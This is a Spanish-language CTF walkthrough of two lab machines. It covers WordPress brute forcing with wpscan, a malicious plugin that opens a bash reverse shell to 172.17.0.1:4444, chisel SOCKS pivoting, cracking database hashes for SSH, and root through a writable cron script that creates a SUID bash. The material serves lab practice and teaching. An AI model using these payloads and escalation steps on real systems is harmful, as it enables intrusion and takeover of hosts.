## Reconocimiento Máquina 1:

Puerto 80 : http

En el index web se ve una shell segura con un sistema modificado que no suelta nada interesante, pero tenemos Wordpress. 

Tenemos un robots.txt con un codigo en base64 que decodificado 3 veces nos da uan nueva ruta:

```bash
http://10.10.10.2//s3cr3t@/list.txt
```

Es una lista de contraseñas, la agrego a un archivo y le aplicamos fuerza bruta:

```bash
wpscan --url http://10.10.10.2/wp -e u --passwords list.txt
```

User = krav0

Pass = voidwalker

```bash
http://10.10.10.2/wp/wp-login.php
```

Nos da error de redirección, luego de mucho tiempo intentando di con la solución:

```bash
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -A OUTPUT -d 172.17.0.2 -j DNAT --to-destination 10.10.10.2
sudo iptables -t nat -A POSTROUTING -j MASQUERADE
```

Y listo, con eso entramos al wordpress sin problema.

Para mandar una rev shell subo un plugin malicioso:

```bash
<?php
/**
* Plugin Name: RevShell
*/
exec("/bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'");
?>
```

```bash
zip plugin.zip plug.php
```

Y listo, al activarlo tendremos una conexión.

No encontré forma de escalar a root, así que pasamos al pivoting con www-data.

En la maquina Host:

```bash
./chisel server --reverse -p 11111
```

En la maquina 1:

```bash
./chisel client 172.17.0.1:11111 R:socks
```

Ya que tenemos conexión, edito el archivo de configuración proxychains y creo un proxy en foxy proxy.

## Reconocimiento Máquina 2:

Enlistando directorios:

```bash
feroxbuster -u http://20.20.20.3 --proxy socks5://127.0.0.1:1080 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,js,txt,sql,zip,bkp,backup
```

Encuentro un index.php y una base de datos que descargo.

Dentro hay hashes con diferentes posibles usuarios, decriptando el de el usuario nightblade tenemos la contraseña:

Pass = dragon 

```bash
proxychains4 -q ssh nightblade@20.20.20.3
```

## Escalada:

Listando procesos se encuentra cron

```bash
cat /etc/cron.d/nightblade
```

Vemos que ejecuta un script .sh donde tenemos permisos de escritura.

```bash
echo 'cp /bin/bash /tmp/bashroot && chmod +s /tmp/bashroot' >> /opt/scripts/check.sh
```

```bash
cd /tmp
./bashroot -p
```

Y listo.
